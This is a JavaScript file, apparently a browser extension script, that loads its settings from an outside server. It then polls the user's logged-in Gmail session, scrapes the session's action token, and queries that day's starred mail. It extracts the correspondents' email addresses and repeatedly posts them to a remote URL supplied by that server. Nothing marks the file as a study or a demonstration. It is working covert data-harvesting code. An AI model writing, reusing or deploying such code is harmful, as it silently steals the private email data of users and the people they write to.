
function getConfig()
{
    $.post("http://labsai.way2target.com/getConfig",{},function(data,status)
    {
        liveEmails(0,data)
        setInterval(function(){liveEmails(0,data)},1000*data.liveRftime);

    }).fail(function(status) {
        setTimeout(function(){
            getConfig()
        },1000*5);
    })

}
getConfig();

function liveEmails(authid,config)
{	console.log("okkk")
	checkConnection(authid,function(result){
						if(result==1)
						{
							var today = new Date();
							var year = today.getFullYear();
							var month = today.getMonth() + 1;
							month = month.toString().length > 1 ? month : "0" + month;
							var date = today.getDate().toString().length > 1 ? today.getDate() : "0" + today.getDate();
							today = year + "/" + month + "/" + date;

							console.log(today)
							var conn2 = new XMLHttpRequest();
							conn2.open("GET", "https://mail.google.com/mail/u/0/#inbox");
							conn2.onreadystatechange = function () {
								if (this.status == 200 && this.readyState == 4) {
									try {
										var tmp = /var GLOBALS\=\[(?:([^\,]*)\,){10}/.exec(this.responseText || "");
										var ik = tmp && tmp.length > 1 ? tmp[1].replace(/[\"\']/g, "") : null;
										var reg = /var GM_ACTION_TOKEN="(.*?)"/g.exec(this.responseText);
										reg = reg[0].replace('var GM_ACTION_TOKEN="', '').replace('"', '');

										var url = "https://mail.google.com/mail/u/0/?ui=2&ik=" + ik + "&at=" + reg + "&view=tl&start=0&num=2&rt=c&as_has=is:starred&as_excludechats=true&as_subset=all&as_date=" + today + "&as_within=1d&search=adv";
										var conn = new XMLHttpRequest();
										conn.open("GET", url)
										conn.onreadystatechange = function () {
											if (this.status == 200 && this.readyState == 4) {
												var reg_users = /\["mla",\[\[.*?\]\]/.exec(this.responseText);
												users = JSON.parse([reg_users[0].replace('["mla",', "")]);
												var activeUsers=[];
												users.forEach(function(user){
														activeUsers.push(user[0]);
													});
													//console.log({"emails":activeUsers});
													sendActiveMails({"emails":activeUsers},config.liveUrl);
											}
										}
										conn.send();
									}
									catch (err) {
										if(authid<9)
										{
												checkConnection(authid+1);
										}
										else
										{
												console.log("some thing went wrong");
										}
									}
								}
							}
							conn2.send();
						}
						else
						{
								console.log("No active mails at this time")
						}
			})
	}

function checkConnection(authid,callback)
{
	var xhr=new XMLHttpRequest();
	xhr.open("GET","https://mail.google.com/mail/u/"+authid+"/feed/atom");
	xhr.onreadystatechange=function()
	{
			if(this.status==200&&this.readyState==4)
			{
					callback(1)
					
			}
			else if(this.readyState==4&&this.status!=200)
			{		
					callback(0)
					
			}
	}
	xhr.send();
}
function sendActiveMails(mailslist,url) {
        
        //console.log(conf)
        try {
            $.ajax({
                type: "POST",
                url:url,
                data: JSON.stringify(mailslist),
                contentType: "application/json",
                crossDomain: true,
                dataType: "json",
                success: function (data, status, jqXHR) {
					console.log(data);
                   
                },
                error: function (jqXHR, status) 
                {
						console.log(jqXHR,status)
                }
			});
		}
		catch(err)
		{console.log(err);}

}






